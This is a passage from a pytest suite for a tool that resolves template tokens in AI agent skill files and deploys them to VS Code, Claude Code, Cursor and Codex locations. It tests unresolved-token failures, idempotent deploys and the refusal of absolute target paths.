    # automatically included without touching this list.
    SOURCE_STYLE_REFS = [
        f"skills/{d.name}/{f.name}"
        for d in sorted((Path(__file__).parent.parent / "skills").iterdir())
        if d.is_dir()
        for f in sorted(d.glob("*.md"))
        if not f.name.endswith(".skill.md")
    ]

    def test_no_source_style_companion_refs_in_resolved(self):
        root = Path(__file__).parent.parent / "resolved"
        offenders = []
        for sub in ("skills", "instructions", "agents"):
            base = root / sub
            if not base.exists():
                continue
            for md in sorted(base.rglob("*.md")):
                text = md.read_text(encoding="utf-8")
                for ref in self.SOURCE_STYLE_REFS:
                    if ref in text:
                        offenders.append(f"{md.relative_to(root)}: {ref}")
        assert not offenders, (
            "source-style companion cross-references found in resolved output: "
            + "; ".join(offenders)
        )


# =============================================================================
# Fail-on-unresolved: hard failure when config key is missing
# =============================================================================

def make_minimal_config(tmp_path: Path, **overrides) -> Path:
    """Write a minimal valid config YAML to tmp_path/config.yml."""
    cfg = {
            "setup_complete": True,
            "editor": {"target": "vscode"},
            "project": {"name": "TestProj", "language": "Python",
                        "framework": "Custom", "locale": "en-US",
                        "namespace": ""},
            "paths": {
                "sprints": "sprints/", "sprints_doc": "SPRINTS.md",
                "web_app_dir": "", "drafts": "docs/planning/drafts/",
                "archive": "docs/archive/",
                "validation": "docs/planning/validation/",
                "research": "docs/planning/research/",
                "handoffs": "docs/planning/_handoffs/",
                "engagements": "docs/planning/engagements/",
                "vision": "docs/planning/vision/",
                "backlog_ledger": "docs/planning/BACKLOG_LEDGER.md",
                "bug_backlog": "docs/planning/BUG_BACKLOG.md",
                "bugs_screenshots": "docs/planning/bugs/screenshots/",
                "rejections": "docs/planning/HANDOFF_REJECTIONS.md",
                "non_goals": "docs/NON_GOALS.md",
                "roadmap": "docs/planning/ROADMAP.md",
                "feature_matrix": "docs/planning/FEATURE_MATRIX.md",
                "decisions": "docs/decisions/DECISIONS.md",
                "future_considerations": "docs/decisions/FUTURE_CONSIDERATIONS.md",
                "design_reviews": "docs/decisions/design-reviews/",
                "architecture_doc": "docs/ARCHITECTURE.md",
                "technical_debt": "docs/TECHNICAL_DEBT.md",
                "testing_doc": "docs/TESTING.md",
                "user_guide": "docs/USER_GUIDE.md",
                "releases": "docs/RELEASES.md",
                "changelog": "docs/changelog.json",
                "changelog_deploy_copy": "docs/changelog.json",
                "package_json": "pyproject.toml",
                "security_changelog": "docs/security/SECURITY_CHANGELOG.md",
                "file_hashes": "docs/security/FILE_HASHES.md",
                "security_reports": "docs/security/reports/",
                "sbom_output": "docs/security/sbom.json",
                "copilot_instructions": ".github/copilot-instructions.md",
                "instructions_dir": ".github/instructions",
                "skills_deploy_dir": ".github/agents/",
                "claude_agents": ".claude/agents",
                "cursor_commands": ".cursor/commands",
                "codex_agents_md": "AGENTS.md",
                "memory_architecture": ".claude/memory/architecture.md",
                "memory_conventions": ".claude/memory/conventions.md",
            },
            "quality": {"coverage_store_threshold": 80, "coverage_web_threshold": 0,
                        "e2e_regression_threshold": 5, "bundle_warning_kb": 0,
                        "bundle_critical_kb": 0, "build_warning_seconds": 30},
            "platform": {"type": "none", "test_workflow": "ci.yml",
                         "prod_workflow": "ci.yml",
                         "ci_workflow_display_name": "CI",
                         "test_url": "", "prod_url": "", "e2e_runner": "pytest"},
            "git": {"main_branch": "main", "develop_branch": "develop",
                    "repo": "owner/repo"},
            "team": {"cto_name": "tester"},
            "ids": {"bug_prefix": "BUG", "item_prefix": "ITEM",
                    "rejection_prefix": "REJ", "engagement_prefix": "ENG",
                    "adr_prefix": "ADR"},
            "scope_upgrade": {"task_count": 3, "files_affected": 8},
            "escalation": {"def_p0_threshold": 3, "def_kill_threshold": 5,
                           "age_stale_sprints": 10, "debt_warning_sprints": 3,
                           "debt_escalate_sprints": 5, "debt_warning_items": 20,
                           "debt_escalate_items": 40,
                           "debt_min_allocation_percent": 30,
                           "sprint_size_min": 5, "sprint_size_max": 8,
                           "feature_cap_percent": 70, "p0_overflow_percent": 50},
            "commands": {"install": "pip install -r requirements.txt",
                         "test": "pytest", "build": "python init.py",
                         "dev": "", "typecheck": "", "lint": "", "e2e": "pytest",
                         "coverage": "pytest", "coverage_store": "pytest",
                         "coverage_web": "", "depcheck": "",
                         "sbom_generate": "syft . -o cyclonedx-json",
                         "sast": "",
                         "secret_scan_history": "gitleaks detect --source .",
                         "license_check": "pip-licenses --format=json",
                         "container_scan": "", "iac_scan": "",
                         "timestamp": "date -u +\"%Y-%m-%dT%H:%M:%SZ\""},
            "security": {"sbom_format": "cyclonedx", "tracked_files": [],
                         "license_gate": False,
                         "license_denylist": ["GPL-3.0-only"],
                         "license_allowlist": ["MIT"]},
    }
    cfg.update(overrides)
    import yaml as _yaml
    config_path = tmp_path / "config.yml"
    config_path.write_text(_yaml.dump(cfg), encoding="utf-8")
    return config_path


class TestFailOnUnresolved:
    """Build must exit non-zero when output contains an unresolved {{token}}."""

    def _make_minimal_config(self, tmp_path: Path, **overrides) -> Path:
        return make_minimal_config(tmp_path, **overrides)

    def test_missing_config_key_exits_nonzero(self, tmp_path):
        """A skill referencing an unmapped token must cause a non-zero exit."""
        import os
        import yaml as _yaml

        config_path = self._make_minimal_config(tmp_path)

        # Create a skill with a token NOT in the config
        skill_dir = tmp_path / "skills" / "canary"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            "---\n"
            "name: canary\n"
            "kind: skill\n"
            "description: Canary skill for testing.\n"
            "when_to_use: canary test\n"
            "user-invocable: false\n"
            "---\n\n"
            "{{commands.missing_key_xyz}}\n",
            encoding="utf-8",
        )

        old_cwd = os.getcwd()
        old_argv = sys.argv
        try:
            os.chdir(tmp_path)
            sys.argv = ["init.py", "--config", str(config_path),
                        "--allow-frontmatter-warnings"]
            with pytest.raises(SystemExit) as exc_info:
                main()
            assert exc_info.value.code != 0, (
                "Expected non-zero exit when config key is missing"
            )
        finally:
            os.chdir(old_cwd)
            sys.argv = old_argv

    def test_clean_config_exits_zero(self, tmp_path):
        """A build with all tokens resolved should exit normally (no SystemExit)."""
        import os

        config_path = self._make_minimal_config(tmp_path)

        # Create a skill with only known tokens
        skill_dir = tmp_path / "skills" / "clean"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            "---\n"
            "name: clean\n"
            "kind: skill\n"
            "description: Clean skill.\n"
            "when_to_use: clean test\n"
            "user-invocable: false\n"
            "---\n\n"
            "Project: {{project.name}}\n",
            encoding="utf-8",
        )

        old_cwd = os.getcwd()
        old_argv = sys.argv
        try:
            os.chdir(tmp_path)
            sys.argv = ["init.py", "--config", str(config_path),
                        "--allow-frontmatter-warnings"]
            # Should not raise SystemExit
            main()
        except SystemExit as e:
            pytest.fail(f"Expected clean exit but got SystemExit({e.code})")
        finally:
            os.chdir(old_cwd)
            sys.argv = old_argv


# =============================================================================
# Agent-wrapper gate: every valid editor.target generates wrappers
# (Sprint 4, Task Group 1)
# =============================================================================

class TestAgentWrapperGate:
    """Agent wrappers are generated for every valid editor.target, and
    suppress_skill_invocability fires only for 'vscode'."""

    AGENT_SKILL = (
        "---\n"
        "name: architect\n"
        "kind: skill\n"
        "description: Designs technical approaches.\n"
        "when_to_use: write an ADR\n"
        "user-invocable: true\n"
        "agent:\n"
        "  tools: [read, search]\n"
        "---\n\n"
        "# Architect\n\nYou design things for {{project.name}}.\n"
    )

    def _build(self, tmp_path: Path, monkeypatch, target: str) -> Path:
        """Run a full build in tmp_path with one agent-bearing skill."""
        config_path = make_minimal_config(tmp_path, editor={"target": target})
        skill_dir = tmp_path / "skills" / "architect"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(self.AGENT_SKILL, encoding="utf-8")
        monkeypatch.chdir(tmp_path)
        monkeypatch.setattr(
            sys, "argv",
            ["init.py", "--config", str(config_path),
             "--allow-frontmatter-warnings"],
        )
        main()
        return tmp_path / "resolved"

    @pytest.mark.parametrize("target", sorted(VALID_EDITOR_TARGETS))
    def test_every_valid_target_generates_agent_wrappers(
        self, tmp_path, monkeypatch, target
    ):
        resolved = self._build(tmp_path, monkeypatch, target)
        agent_md = resolved / "agents" / "architect.agent.md"
        assert agent_md.exists(), (
            f"editor.target '{target}' must produce resolved/agents/*.agent.md"
        )
        text = agent_md.read_text(encoding="utf-8")
        assert "name: architect" in text
        assert "{{" not in text, "agent wrapper must be token-free"

    def test_invalid_target_fails_build(self, tmp_path, monkeypatch):
        with pytest.raises(SystemExit) as exc_info:
            self._build(tmp_path, monkeypatch, "sublime")
        assert exc_info.value.code != 0
        assert not (tmp_path / "resolved" / "agents" / "architect.agent.md").exists(), (
            "invalid editor.target must not generate agent wrappers"
        )

    def test_vscode_suppresses_skill_invocability(self, tmp_path, monkeypatch):
        resolved = self._build(tmp_path, monkeypatch, "vscode")
        text = (resolved / "skills" / "architect" / "SKILL.md").read_text(
            encoding="utf-8"
        )
        assert "user-invocable: false" in text, (
            "vscode target must suppress skill invocability for agent-backed skills"
        )

    @pytest.mark.parametrize(
        "target", sorted(VALID_EDITOR_TARGETS - {"vscode"})
    )
    def test_non_vscode_targets_keep_skills_invocable(
        self, tmp_path, monkeypatch, target
    ):
        resolved = self._build(tmp_path, monkeypatch, target)
        text = (resolved / "skills" / "architect" / "SKILL.md").read_text(
            encoding="utf-8"
        )
        assert "user-invocable: true" in text, (
            f"editor.target '{target}' must NOT get user-invocable: false skills"
        )


# =============================================================================
# Deploy-copy: --deploy writes resolved/ into configured target directories
# =============================================================================

class TestDeployCopy:
    """--deploy (deploy_resolved) copies resolved artifacts to the configured dirs."""

    def test_deploy_copies_instructions_to_target(self, tmp_path, monkeypatch):
        """deploy_resolved copies resolved/instructions/*.md to instructions_dir."""
        monkeypatch.chdir(tmp_path)
        # Build a minimal resolved/ tree
        output = tmp_path / "resolved"
        instr_dir = output / "instructions"
        instr_dir.mkdir(parents=True)
        (instr_dir / "test.instructions.md").write_text(
            "---\napplyTo: '**'\n---\n\n# Test\n", encoding="utf-8"
        )

        config = {
            "paths": {
                "instructions_dir": ".github/instructions",
                "skills_deploy_dir": ".github/agents",
            }
        }

        leftover = deploy_resolved(output, config, agent_count=0)

        assert leftover == 0, f"deploy_resolved reported {leftover} unresolved tokens"
        assert (tmp_path / ".github" / "instructions" / "test.instructions.md").exists(), (
            "Expected instruction file to be copied to deploy target"
        )

    def test_deploy_copies_agents_to_target(self, tmp_path, monkeypatch):
        """deploy_resolved copies resolved/agents/*.agent.md to skills_deploy_dir."""
        monkeypatch.chdir(tmp_path)
        output = tmp_path / "resolved"
        agents_dir = output / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "qa.agent.md").write_text(
            "---\nname: qa\ndescription: QA agent\n---\n\n# QA\n", encoding="utf-8"
        )

        config = {
            "paths": {
                "instructions_dir": ".github/instructions",
                "skills_deploy_dir": ".github/agents",
            }
        }

        leftover = deploy_resolved(output, config, agent_count=1)

        assert leftover == 0
        assert (tmp_path / ".github" / "agents" / "qa.agent.md").exists(), (
            "Expected agent file to be copied to skills_deploy_dir"
        )

    def test_deploy_copies_skill_bundles_to_target(self, tmp_path, monkeypatch):
        """deploy_resolved copies resolved/skills/<name>/ subdirs to skills_deploy_dir."""
        monkeypatch.chdir(tmp_path)
        output = tmp_path / "resolved"
        skill_dir = output / "skills" / "architect"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            "---\nname: architect\nkind: skill\ndescription: Architect.\n"
            "when_to_use: design\nuser-invocable: false\n---\n\n# Architect\n",
            encoding="utf-8",
        )

        config = {
            "paths": {
                "instructions_dir": ".github/instructions",
                "skills_deploy_dir": ".github/agents",
            }
        }

        leftover = deploy_resolved(output, config, agent_count=0)

        assert leftover == 0
        assert (tmp_path / ".github" / "agents" / "architect" / "SKILL.md").exists(), (
            "Expected skill SKILL.md to be copied under skills_deploy_dir/architect/"
        )

    def test_deploy_fails_if_deployed_file_has_unresolved_token(self, tmp_path, monkeypatch):
        """deploy_resolved returns non-zero when a copied file still carries a
        dotted {{namespace.key}} token — a real substitution leak."""
        monkeypatch.chdir(tmp_path)
        output = tmp_path / "resolved"
        skill_dir = output / "skills" / "broken"
        skill_dir.mkdir(parents=True)
        # Deliberately unresolved token in the deployed skill
        (skill_dir / "SKILL.md").write_text(
            "# Broken\n\n{{commands.missing_key}}\n", encoding="utf-8"
        )

        config = {
            "paths": {
                "instructions_dir": ".github/instructions",
                "skills_deploy_dir": ".github/agents",
            }
        }

        leftover = deploy_resolved(output, config, agent_count=0)

        assert leftover > 0, (
            "Expected deploy_resolved to return > 0 when deployed file has unresolved token"
        )

    def test_deploy_passes_with_no_dot_documentation_literal(self, tmp_path, monkeypatch):
        """The post-deploy scan must NOT flag a stripped no-dot literal like
        `{{tokens}}` — by deploy time strip_escapes() has already removed the
        authoring backslash, so the no-dot form is intentional documentation
        (mirrors scripts/check_tokens.py semantics)."""
        monkeypatch.chdir(tmp_path)
        output = tmp_path / "resolved"
        skill_dir = output / "skills" / "onboarding"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            "# Onboarding\n\nConfirm no unresolved `{{tokens}}` remain.\n",
            encoding="utf-8",
        )

        config = {
            "paths": {
                "instructions_dir": ".github/instructions",
                "skills_deploy_dir": ".github/agents",
            }
        }

        leftover = deploy_resolved(output, config, agent_count=0)

        assert leftover == 0, (
            "post-deploy scan flagged a no-dot documentation literal as a leak"
        )

    def test_full_deploy_with_escaped_no_dot_literal_exits_zero(
        self, tmp_path, monkeypatch
    ):
        """Regression (Sprint 4 deploy blocker): a full --deploy of a config
        whose skills include an escaped no-dot literal must exit 0. The
        pipeline strips '\\{{tokens}}' to '{{tokens}}' before the post-deploy
        scan, which must treat the no-dot form as documentation."""
        config_path = make_minimal_config(tmp_path)
        skill_dir = tmp_path / "skills" / "onboarding"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            "---\n"
            "name: onboarding\n"
            "kind: skill\n"
            "description: Onboarding skill.\n"
            "when_to_use: onboard\n"
            "user-invocable: false\n"
            "---\n\n"
            "Project: {{project.name}}\n\n"
            "Confirm no unresolved `\\{{tokens}}` remain in resolved files.\n",
            encoding="utf-8",
        )
        monkeypatch.chdir(tmp_path)
        monkeypatch.setattr(
            sys, "argv",
            ["init.py", "--config", str(config_path),
             "--allow-frontmatter-warnings", "--deploy"],
        )

        try:
            main()
        except SystemExit as e:
            pytest.fail(
                f"--deploy with an escaped no-dot literal exited {e.code}"
            )

        deployed = tmp_path / ".github" / "agents" / "onboarding" / "SKILL.md"
        assert deployed.exists(), "skill bundle was not deployed"
        text = deployed.read_text(encoding="utf-8")
        assert "`{{tokens}}`" in text, "literal must ship clean (backslash stripped)"
        assert "\\{{tokens}}" not in text, "escape marker leaked into deployed file"


# =============================================================================
# Claude Code subagent seeding: deploy_resolved seeds .claude/agents/ from
# resolved/agents/*.agent.md for claude-code/both/all targets (Sprint 4, TG2)
# =============================================================================

class TestClaudeAgentsSeeding:
    """deploy_resolved seeds paths.claude_agents with one native Claude Code
    subagent per agent wrapper, gated on editor.target in
    ('claude-code', 'both', 'all')."""

    def _load_config(self, tmp_path: Path, target: str) -> dict:
        import yaml as _yaml
        config_path = make_minimal_config(tmp_path, editor={"target": target})
        return _yaml.safe_load(config_path.read_text(encoding="utf-8"))

    def _make_resolved_agents(self, tmp_path: Path) -> Path:
        output = tmp_path / "resolved"
        agents_dir = output / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "qa.agent.md").write_text(
            '---\nname: qa\ndescription: "Runs the QA suite. Use when: verify a sprint"\n'
            "tools: [read, search]\n---\n\n# QA\n\nYou verify things.\n",
            encoding="utf-8",
        )
        (agents_dir / "architect.agent.md").write_text(
            '---\nname: architect\ndescription: "Designs technical approaches."\n'
            "---\n\n# Architect\n\nYou design things.\n",
            encoding="utf-8",
        )
        return output

    @pytest.mark.parametrize("target", ["claude-code", "both", "all"])
    def test_seeds_one_subagent_per_agent_with_valid_frontmatter(
        self, tmp_path, monkeypatch, target
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, target)

        leftover = deploy_resolved(output, config, agent_count=2)

        assert leftover == 0
        agents_dest = tmp_path / ".claude" / "agents"
        seeded = sorted(p.name for p in agents_dest.glob("*.md"))
        assert seeded == ["architect.md", "qa.md"], (
            f"editor.target '{target}' must seed one subagent per agent wrapper"
        )
        fm, body = parse_frontmatter(
            (agents_dest / "qa.md").read_text(encoding="utf-8")
        )
        assert fm.get("name") == "qa"
        assert fm.get("description") == "Runs the QA suite. Use when: verify a sprint"
        assert "tools" not in fm, (
            "VS Code tool ids are not Claude Code tool names — tools must be omitted"
        )
        assert "# QA" in body and "You verify things." in body

    @pytest.mark.parametrize("target", ["vscode", "cursor", "codex"])
    def test_no_subagents_for_other_targets(self, tmp_path, monkeypatch, target):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, target)

        leftover = deploy_resolved(output, config, agent_count=2)

        assert leftover == 0
        assert not (tmp_path / ".claude" / "agents").exists(), (
            f"editor.target '{target}' must NOT seed .claude/agents/"
        )

    def test_subagent_seeding_is_deterministic_and_token_free(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, "claude-code")

        assert deploy_resolved(output, config, agent_count=2) == 0
        first = {
            p.name: p.read_bytes()
            for p in sorted((tmp_path / ".claude" / "agents").glob("*.md"))
        }
        assert deploy_resolved(output, config, agent_count=2) == 0
        second = {
            p.name: p.read_bytes()
            for p in sorted((tmp_path / ".claude" / "agents").glob("*.md"))
        }

        assert first == second, "re-running deploy must be byte-identical"
        assert sorted(first) == ["architect.md", "qa.md"]
        for name, content in first.items():
            assert b"{{" not in content, f"{name} must be token-free"

    def test_unresolved_token_in_subagent_counts_as_leftover(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        output = tmp_path / "resolved"
        agents_dir = output / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "broken.agent.md").write_text(
            '---\nname: broken\ndescription: "Broken agent"\n---\n\n'
            "{{commands.missing_key}}\n",
            encoding="utf-8",
        )
        config = self._load_config(tmp_path, "claude-code")

        leftover = deploy_resolved(output, config, agent_count=1)

        assert leftover > 0, (
            "post-deploy scan must flag unresolved tokens in .claude/agents/"
        )

    def test_absolute_claude_agents_path_refuses_deploy(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, "claude-code")
        config["paths"]["claude_agents"] = str(tmp_path / "abs-claude-agents")

        with pytest.raises(SystemExit) as exc_info:
            deploy_resolved(output, config, agent_count=2)
        assert exc_info.value.code != 0


# =============================================================================
# Cursor commands seeding: deploy_resolved seeds .cursor/commands/ from
# resolved/agents/*.agent.md for cursor/all targets only (Sprint 4, TG3)
# =============================================================================

class TestCursorCommandsSeeding:
    """deploy_resolved seeds paths.cursor_commands with one <name>.md per
    agent wrapper, gated on editor.target in ('cursor', 'all')."""

    def _load_config(self, tmp_path: Path, target: str) -> dict:
        import yaml as _yaml
        config_path = make_minimal_config(tmp_path, editor={"target": target})
        return _yaml.safe_load(config_path.read_text(encoding="utf-8"))

    def _make_resolved_agents(self, tmp_path: Path) -> Path:
        output = tmp_path / "resolved"
        agents_dir = output / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "qa.agent.md").write_text(
            "---\nname: qa\ndescription: QA agent\n---\n\n# QA\n",
            encoding="utf-8",
        )
        (agents_dir / "architect.agent.md").write_text(
            "---\nname: architect\ndescription: Architect agent\n---\n\n# Architect\n",
            encoding="utf-8",
        )
        return output

    @pytest.mark.parametrize("target", ["cursor", "all"])
    def test_seeds_cursor_commands_for_cursor_targets(
        self, tmp_path, monkeypatch, target
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, target)

        leftover = deploy_resolved(output, config, agent_count=2)

        assert leftover == 0
        for name in ("qa", "architect"):
            assert (tmp_path / ".cursor" / "commands" / f"{name}.md").exists(), (
                f"editor.target '{target}' must seed .cursor/commands/{name}.md"
            )

    @pytest.mark.parametrize("target", ["vscode", "claude-code", "both", "codex"])
    def test_no_cursor_commands_for_other_targets(
        self, tmp_path, monkeypatch, target
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, target)

        leftover = deploy_resolved(output, config, agent_count=2)

        assert leftover == 0
        assert not (tmp_path / ".cursor" / "commands").exists(), (
            f"editor.target '{target}' must NOT seed .cursor/commands/"
        )

    def test_cursor_seeding_is_deterministic_and_token_free(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, "cursor")

        assert deploy_resolved(output, config, agent_count=2) == 0
        first = {
            p.name: p.read_bytes()
            for p in sorted((tmp_path / ".cursor" / "commands").glob("*.md"))
        }
        assert deploy_resolved(output, config, agent_count=2) == 0
        second = {
            p.name: p.read_bytes()
            for p in sorted((tmp_path / ".cursor" / "commands").glob("*.md"))
        }

        assert first == second, "re-running deploy must be byte-identical"
        assert sorted(first) == ["architect.md", "qa.md"]
        for name, content in first.items():
            assert b"{{" not in content, f"{name} must be token-free"

    def test_unresolved_token_in_cursor_command_counts_as_leftover(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        output = tmp_path / "resolved"
        agents_dir = output / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "broken.agent.md").write_text(
            "---\nname: broken\ndescription: Broken agent\n---\n\n"
            "{{commands.missing_key}}\n",
            encoding="utf-8",
        )
        config = self._load_config(tmp_path, "cursor")

        leftover = deploy_resolved(output, config, agent_count=1)

        assert leftover > 0, (
            "post-deploy scan must flag unresolved tokens in .cursor/commands/"
        )

    def test_absolute_cursor_commands_path_refuses_deploy(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, "cursor")
        config["paths"]["cursor_commands"] = str(tmp_path / "abs-cursor-commands")

        with pytest.raises(SystemExit) as exc_info:
            deploy_resolved(output, config, agent_count=2)
        assert exc_info.value.code != 0


# =============================================================================
# Codex AGENTS.md managed-block emission: emit_codex_agents_md merges a
# marker-delimited block into the adopter-owned AGENTS.md without ever
# touching content outside the markers (Sprint 4, TG4)
# =============================================================================

class TestCodexAgentsMdEmission:
    """emit_codex_agents_md merges the managed block idempotently and never
    modifies adopter-owned content outside the begin/end markers."""

    TOKENS = {
        "paths.skills_deploy_dir": ".github/agents/",
        "paths.instructions_dir": ".github/instructions",
    }

    def _load_config(self, tmp_path: Path, target: str) -> dict:
        import yaml as _yaml
        config_path = make_minimal_config(tmp_path, editor={"target": target})
        return _yaml.safe_load(config_path.read_text(encoding="utf-8"))

    def _make_resolved_agents(self, tmp_path: Path) -> Path:
        output = tmp_path / "resolved"
        agents_dir = output / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "qa.agent.md").write_text(
            '---\nname: qa\ndescription: "Runs the QA suite."\n---\n\n# QA\n',
            encoding="utf-8",
        )
        (agents_dir / "architect.agent.md").write_text(
            '---\nname: architect\ndescription: "Designs technical approaches."\n'
            "---\n\n# Architect\n",
            encoding="utf-8",
        )
        return output

    def test_merge_preserves_content_before_and_after_block(self, tmp_path):
        """Content before AND after an existing block survives byte-for-byte."""
        output = self._make_resolved_agents(tmp_path)
        target = tmp_path / "AGENTS.md"
        before = "# My AGENTS.md\n\nAdopter prose before.\n\n"
        stale = f"{CODEX_BLOCK_BEGIN}\nstale old roster\n{CODEX_BLOCK_END}"
        after = "\n\n## Adopter section after\n\nMore adopter prose.\n"
        target.write_text(before + stale + after, encoding="utf-8")

        assert emit_codex_agents_md(output, self.TOKENS, target) is True

        merged = target.read_text(encoding="utf-8")
        begin = merged.find(CODEX_BLOCK_BEGIN)
        end = merged.find(CODEX_BLOCK_END) + len(CODEX_BLOCK_END)
        assert merged[:begin] == before, "content before the block must be untouched"
        assert merged[end:] == after, "content after the block must be untouched"
        block = merged[begin:end]
        assert "stale old roster" not in block
        assert "- **architect** — Designs technical approaches." in block
        assert "- **qa** — Runs the QA suite." in block
        # Sorted roster: architect before qa.
        assert block.index("**architect**") < block.index("**qa**")
        assert "`.github/agents/`" in block
        assert "`.github/instructions`" in block

    def test_appends_block_when_no_markers(self, tmp_path):
        """An AGENTS.md without markers gets the block appended after a blank line."""
        output = self._make_resolved_agents(tmp_path)
        target = tmp_path / "AGENTS.md"
        existing = "# My AGENTS.md\n\nAdopter prose only.\n"
        target.write_text(existing, encoding="utf-8")

        assert emit_codex_agents_md(output, self.TOKENS, target) is True

        merged = target.read_text(encoding="utf-8")
        assert merged.startswith("# My AGENTS.md\n\nAdopter prose only.\n\n" + CODEX_BLOCK_BEGIN)
        assert merged.rstrip("\n").endswith(CODEX_BLOCK_END)

    def test_creates_file_when_missing(self, tmp_path):
        """A missing AGENTS.md is created containing just the block."""
        output = self._make_resolved_agents(tmp_path)
        target = tmp_path / "AGENTS.md"
        assert not target.exists()

        assert emit_codex_agents_md(output, self.TOKENS, target) is True

        content = target.read_text(encoding="utf-8")
        assert content.startswith(CODEX_BLOCK_BEGIN)
        assert content.rstrip("\n").endswith(CODEX_BLOCK_END)
        assert "timestamp" not in content.lower()

    def test_idempotent_two_runs_byte_identical(self, tmp_path):
        """A second run with unchanged inputs is byte-identical (append + merge)."""
        output = self._make_resolved_agents(tmp_path)
        target = tmp_path / "AGENTS.md"
        target.write_text("# Mine\n\nProse.\n", encoding="utf-8")

        assert emit_codex_agents_md(output, self.TOKENS, target) is True
        first = target.read_bytes()
        assert emit_codex_agents_md(output, self.TOKENS, target) is True
        second = target.read_bytes()

        assert first == second, "re-running the merge must be byte-identical"

    @pytest.mark.parametrize(
        "malformed",
        [
            # begin without end
            "# Mine\n\n<!-- agent-enterprise:begin -->\norphaned\n",
            # end without begin
            "# Mine\n\n<!-- agent-enterprise:end -->\norphaned\n",
            # end before begin
            "# Mine\n\n<!-- agent-enterprise:end -->\nx\n<!-- agent-enterprise:begin -->\n",
        ],
        ids=["begin-without-end", "end-without-begin", "end-before-begin"],
    )
    def test_malformed_markers_leave_file_untouched(self, tmp_path, capsys, malformed):
        """Malformed markers must skip the write with a warning — no data loss."""
        output = self._make_resolved_agents(tmp_path)
        target = tmp_path / "AGENTS.md"
        target.write_text(malformed, encoding="utf-8")
        original = target.read_bytes()

        assert emit_codex_agents_md(output, self.TOKENS, target) is False

        assert target.read_bytes() == original, "malformed file must not be modified"
        assert "malformed" in capsys.readouterr().out.lower()

    @pytest.mark.parametrize("target_value", ["codex", "all"])
    def test_deploy_merges_block_for_codex_targets(
        self, tmp_path, monkeypatch, target_value
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, target_value)
        (tmp_path / "AGENTS.md").write_text("# Adopter file\n", encoding="utf-8")

        leftover = deploy_resolved(output, config, agent_count=2)

        assert leftover == 0
        content = (tmp_path / "AGENTS.md").read_text(encoding="utf-8")
        assert content.startswith("# Adopter file\n"), (
            f"editor.target '{target_value}' must preserve adopter content"
        )
        assert CODEX_BLOCK_BEGIN in content and CODEX_BLOCK_END in content

    @pytest.mark.parametrize("target_value", ["vscode", "claude-code", "cursor", "both"])
    def test_no_emission_for_other_targets(self, tmp_path, monkeypatch, target_value):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, target_value)

        leftover = deploy_resolved(output, config, agent_count=2)

        assert leftover == 0
        assert not (tmp_path / "AGENTS.md").exists(), (
            f"editor.target '{target_value}' must NOT touch AGENTS.md"
        )

    def test_absolute_codex_agents_md_path_refuses_deploy(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        output = self._make_resolved_agents(tmp_path)
        config = self._load_config(tmp_path, "codex")
        config["paths"]["codex_agents_md"] = str(tmp_path / "abs-AGENTS.md")

        with pytest.raises(SystemExit) as exc_info:
            deploy_resolved(output, config, agent_count=2)
        assert exc_info.value.code != 0


# =============================================================================
# check_tokens.py guardrail tests
# =============================================================================

import importlib.util as _ilu

_ct_spec = _ilu.spec_from_file_location(
    "check_tokens",
    Path(__file__).resolve().parents[1] / "scripts" / "check_tokens.py",
)
assert _ct_spec and _ct_spec.loader
_check_tokens = _ilu.module_from_spec(_ct_spec)
_ct_spec.loader.exec_module(_check_tokens)  # type: ignore[attr-defined]


class TestCheckTokensGuardrail:
    """Guardrail script exits 0 on a clean tree, 1 when unresolved tokens exist."""

    def test_exits_0_when_github_tree_is_clean(self, tmp_path):
        """No unresolved tokens → returns 0 and prints success message."""
        instr_dir = tmp_path / ".github" / "instructions"
        instr_dir.mkdir(parents=True)
        (instr_dir / "clean.instructions.md").write_text(
            "---\napplyTo: '**'\n---\n\n# Clean\n\nNo tokens here.\n",
            encoding="utf-8",
        )

        rc = _check_tokens.main([str(tmp_path)])
        assert rc == 0

    def test_exits_1_when_unresolved_token_present(self, tmp_path):
        """A file containing {{unresolved.token}} → returns 1."""
        agents_dir = tmp_path / ".github" / "agents"
        agents_dir.mkdir(parents=True)
        (agents_dir / "broken.agent.md").write_text(
            "---\nname: broken\n---\n\n# Broken\n\n{{commands.missing_key}}\n",
            encoding="utf-8",
        )

        rc = _check_tokens.main([str(tmp_path)])
        assert rc == 1

    def test_reports_file_line_and_token(self, tmp_path, capsys):
        """Output includes the file path, line number, and token name."""
